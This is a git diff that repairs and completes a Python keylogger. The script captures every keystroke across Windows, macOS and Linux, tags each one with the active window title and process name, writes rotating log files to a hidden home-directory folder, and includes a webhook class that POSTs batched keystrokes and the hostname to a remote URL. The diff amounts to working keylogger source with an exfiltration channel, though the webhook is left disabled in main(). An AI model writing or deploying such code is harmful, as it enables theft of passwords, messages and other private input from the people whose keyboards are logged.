@@ -5,22 +5,20 @@ This script captures keyboard inputs and logs them to a file.
 Yeah sick, thats it.
 """
 
-from re import S
 import sys
 import logging
 import platform
 from enum import (
     Enum,
     auto,
-   )
+)
 from threading import (
     Event,
-    lock,
-   )
+    Lock,
+)
 from pathlib import Path
-from datetime import datetime, datetime_CAPI
-from dataclasses import datacalss, dataclass
-from tkinter import CHAR
+from datetime import datetime
+from dataclasses import dataclass
 
 
 try:
@@ -55,10 +53,12 @@ elif platform.system() == "Linux":
     except ImportError:
         subprocess = None
 
+
 class KeyType(Enum):
     CHAR = auto()
     SPECIAL = auto()
-    UNKOWN = auto()
+    UNKNOWN = auto()
+
 
 @dataclass
 class KeyloggerConfig:
@@ -72,7 +72,7 @@ class KeyloggerConfig:
     log_special_keys: bool = True
 
     def __post_init__(self):
-        self.log_dir.mkdir(parents = True, exist_ok = True)
+        self.log_dir.mkdir(parents=True, exist_ok=True)
 
 
 @dataclass
@@ -87,12 +87,14 @@ class KeyEvent:
             "timestamp": self.timestamp.isoformat(),
             "key": self.key,
             "window_title": self.window_title or "Unknown",
-            "key_type": self.key_type.name.lower()}
+            "key_type": self.key_type.name.lower()
+        }
 
     def to_log_string(self) -> str:
         time_str = self.timestamp.strftime("%Y-%m-%d %H:%M:%S")
         window_info = f" [{self.window_title}]" if self.window_title else ""
         return f"[{time_str}]{window_info} {self.key}"
+
 
 class WindowTracker:
     @staticmethod
@@ -107,36 +109,42 @@ class WindowTracker:
 
         return None
 
-@staticmethod
-def _get_windows_window() -> str | None:
-    try:
-        window = win32gui.GetForegroundWindow()
-        __, pid = win32process.GetWindowThreadProcessID(window)
-        process = psutil.Process(pid)
-        window_title - win32gui.GetWindowText(window)
-        return f"{process.name()} - {window_title}" if window_title else process.name()
-    except Exception:
-                return None
+    @staticmethod
+    def _get_windows_window() -> str | None:
+        try:
+            window = win32gui.GetForegroundWindow()
+            __, pid = win32process.GetWindowThreadProcessId(window)
+            process = psutil.Process(pid)
+            window_title = win32gui.GetWindowText(window)
+            return f"{process.name()} - {window_title}" if window_title else process.name()
+        except Exception:
+            return None
 
-@staticmethod
-def _get_macos_window() -> str | None:
-    try:
-        active_app = NSworkspace.sharedWorkspace().activeApplication()
-        return active_app.get("NSApplicationName", 'Unknown')
-    except Exception:
-        return None
+    @staticmethod
+    def _get_macos_window() -> str | None:
+        try:
+            active_app = NSWorkspace.sharedWorkspace().activeApplication()
+            return active_app.get("NSApplicationName", "Unknown")
+        except Exception:
+            return None
 
-@staticmethod
-def _get_linux_window() -> str | None:
-    try:
-        result = subprocess.run(['xdotool', 'getactivewindow', 'getwindowname'], capture_output = True,
-                                text = True, timeout = 1, check = False)
-        return result.stdout.strip() if result.returncode == 0 else None
-    except Exception:
-        return None
+    @staticmethod
+    def _get_linux_window() -> str | None:
+        try:
+            result = subprocess.run(
+                ["xdotool", "getactivewindow", "getwindowname"],
+                capture_output=True,
+                text=True,
+                timeout=1,
+                check=False
+            )
+            return result.stdout.strip() if result.returncode == 0 else None
+        except Exception:
+            return None
+
 
 class LogManager:
-    #managin log fle creation, rotation, and writing
+   #Manages log file creation, rotation, and writing
 
     def __init__(self, config: KeyloggerConfig):
         self.config = config
@@ -147,7 +155,7 @@ class LogManager:
     def _setup_logger(self) -> logging.Logger:
         logger = logging.getLogger("Keylogger")
         logger.setLevel(logging.INFO)
-        handler = logging.Filehandler(self.current_log_path)
+        handler = logging.FileHandler(self.current_log_path)
         handler.setFormatter(logging.Formatter("%(message)s"))
         logger.addHandler(handler)
         return logger
@@ -156,7 +164,7 @@ class LogManager:
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         return self.config.log_dir / f"{self.config.log_file_prefix}_{timestamp}.txt"
 
-    def write_event(slef, event: KeyEvent) -> None:
+    def write_event(self, event: KeyEvent) -> None:
         with self.lock:
             self.logger.info(event.to_log_string())
             self._check_rotation()
@@ -167,16 +175,18 @@ class LogManager:
             self.logger.handlers[0].close()
             self.logger.removeHandler(self.logger.handlers[0])
             self.current_log_path = self._get_new_log_path()
-            handler = logging.Filehandler(self.current_log_path)
+            handler = logging.FileHandler(self.current_log_path)
             handler.setFormatter(logging.Formatter("%(message)s"))
             self.logger.addHandler(handler)
 
     def get_current_log_content(self) -> str:
         with self.lock:
-            return self.current_log_path.read_text(encoding = "utf-8")
+            return self.current_log_path.read_text(encoding="utf-8")
+
 
 class WebhookDelivery:
-    # handles batched delifver of logs to a webhook URL
+    #Handles batched delivery of logs to a webhook URL
+
     def __init__(self, config: KeyloggerConfig):
         self.config = config
         self.event_buffer: list[KeyEvent] = []
@@ -187,9 +197,180 @@ class WebhookDelivery:
         if not self.enabled:
             return
         with self.buffer_lock:
-            seelf.event_buffer.append(event)
+            self.event_buffer.append(event)
             if len(self.event_buffer) >= self.config.webhook_batch_size:
                 self._deliver_batch()
 
     def _deliver_batch(self) -> None:
-        
+        if not self.event_buffer or not self.config.webhook_url:
+            return
+
+        payload = {
+            "timestamp": datetime.now().isoformat(),
+            "host": platform.node(),
+            "events": [event.to_dict() for event in self.event_buffer]
+        }
+
+        try:
+            response = requests.post(
+                self.config.webhook_url,
+                json=payload,
+                timeout=5
+            )
+
+            if response.status_code == 200:
+                self.event_buffer.clear()
+        except Exception as e:
+            logging.error("Webhook delivery failed: %s", e)
+
+    def flush(self) -> None:
+        with self.buffer_lock:
+            self._deliver_batch()
+
+
+class Keylogger:
+  #  Main keylogger class init?
+
+    def __init__(self, config: KeyloggerConfig):
+        self.config = config
+        self.log_manager = LogManager(config)
+        self.webhook = WebhookDelivery(config)
+        self.window_tracker = WindowTracker()
+        self.is_running = Event()
+        self.is_logging = Event()
+        self.listener: keyboard.Listener | None = None
+        self._current_window: str | None = None
+        self._last_window_check = datetime.now()
+
+    def _update_active_window(self) -> None:
+        if not self.config.enable_window_tracking:
+            return
+
+        now = datetime.now()
+        if (now - self._last_window_check).total_seconds() >= 0.5:
+            self._current_window = self.window_tracker.get_active_window()
+            self._last_window_check = now
+
+    def _process_key(self, key: Key | KeyCode) -> tuple[str, KeyType]:
+      #  Convert key to string representation and type
+        special_keys = {
+            Key.space: "[SPACE]",
+            Key.enter: "[ENTER]",
+            Key.backspace: "[BACKSPACE]",
+            Key.tab: "[TAB]",
+            Key.delete: "[DELETE]",
+            Key.shift: "[SHIFT]",
+            Key.ctrl: "[CTRL]",
+            Key.ctrl_r: "[CTRL]",
+            Key.alt: "[ALT]",
+            Key.alt_r: "[ALT]",
+            Key.cmd: "[CMD]",
+            Key.cmd_r: "[CMD]",
+            Key.esc: "[ESC]",
+            Key.up: "[UP]",
+            Key.down: "[DOWN]",
+            Key.left: "[LEFT]",
+            Key.right: "[RIGHT]",
+        }
+
+        if isinstance(key, Key):
+            if key in special_keys:
+                return special_keys[key], KeyType.SPECIAL
+            return f"[{key.name.upper()}]", KeyType.SPECIAL
+
+        if hasattr(key, "char") and key.char:
+            return key.char, KeyType.CHAR
+        return "[UNKNOWN]", KeyType.UNKNOWN
+
+    def _on_press(self, key: Key | KeyCode) -> None:
+        if key == self.config.toggle_key:
+            self._toggle_logging()
+            return
+        if not self.is_logging.is_set():
+            return
+
+        self._update_active_window()
+
+        key_str, key_type = self._process_key(key)
+
+        if key_type == KeyType.SPECIAL and not self.config.log_special_keys:
+            return
+        event = KeyEvent(
+            timestamp=datetime.now(),
+            key=key_str,
+            window_title=self._current_window,
+            key_type=key_type
+        )
+        self.log_manager.write_event(event)
+        self.webhook.add_event(event)
+
+    def _toggle_logging(self) -> None:
+     #Toggle logging on and off with F9 key fam
+        if self.is_logging.is_set():
+            self.is_logging.clear()
+            print("\n[*] Logging paused. Press F9 to resume.")
+        else:
+            self.is_logging.set()
+            print("\n[*] Logging resumed. Press F9 to pause.")
+
+    def start(self) -> None:
+     #start da ting
+        print("Keylogger started")
+        print()
+        print(f"Log Directory: {self.config.log_dir}")
+        print(f"Current Log: {self.log_manager.current_log_path.name}")
+        print(f"Toggle Key: {self.config.toggle_key.name.upper()}")
+        print(f"Webhook: {'Enabled' if self.webhook.enabled else 'Disabled'}")
+        print()
+        print("[*] Press F9 to start/stop logging")
+        print("[*] Press CTRL+C to exit\n")
+
+        self.is_running.set()
+        self.is_logging.set()
+
+        self.listener = keyboard.Listener(on_press=self._on_press)
+        self.listener.start()
+
+        try:
+            while self.is_running.is_set():
+                self.listener.join(timeout=1.0)
+        except KeyboardInterrupt:
+            self.stop()
+
+    def stop(self) -> None:
+    #stop da ting (hopefully)
+        print("\n[*] Stopping keylogger...")
+
+        self.is_running.clear()
+        self.is_logging.clear()
+        if self.listener:
+            self.listener.stop()
+
+        self.webhook.flush()
+
+        print(f"[*] Logs saved to {self.config.log_dir}")
+        print("[*] Keylogger stopped.")
+
+def main() -> None:
+  #entry point for the keylogger
+    config = KeyloggerConfig(
+        log_dir=Path.home() / ".keylogger_logs",
+        max_log_size_mb=5.0,
+        webhook_url=None,
+        webhook_batch_size=50,
+        toggle_key=Key.f9,
+        enable_window_tracking=True,
+        log_special_keys=True
+    )
+    keylogger = Keylogger(config)
+
+    try:
+        keylogger.start()
+    except Exception as e:
+        print(f"\n[!] Error: {e}")
+        keylogger.stop()
+
+
+if __name__ == "__main__":
+    main()
+
